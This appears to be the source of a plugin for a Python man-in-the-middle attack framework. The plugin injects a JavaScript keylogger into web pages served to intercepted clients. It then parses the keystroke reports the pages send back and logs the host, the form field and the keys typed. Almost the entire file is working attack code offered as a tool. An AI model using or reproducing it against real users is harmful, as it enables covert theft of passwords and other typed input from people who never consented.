#!/usr/bin/env python2.7

# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

from plugins.inject import Inject
from plugins.plugin import Plugin

class JSKeylogger(Inject, Plugin):
    name       = "JSKeylogger"
    optname    = "jskeylogger"
    desc       = "Injects a javascript keylogger into clients webpages"
    version    = "0.3"

    def initialize(self, options):
        Inject.initialize(self, options)
        self.js_file = "./core/javascript/msfkeylogger.js"

    def request(self, request):
        if 'keylog' in request.uri:
            request.handle_post_output = True

            arr = request.postData
            name = arr[0].split("=")[1]
            value = arr[1].split("=")[1]

            self.clientlog.info("Host: {} | Field: {} | Keys: {}".format(request.headers['host'], name, value), extra=request.clientInfo)

    def options(self, options):
        pass
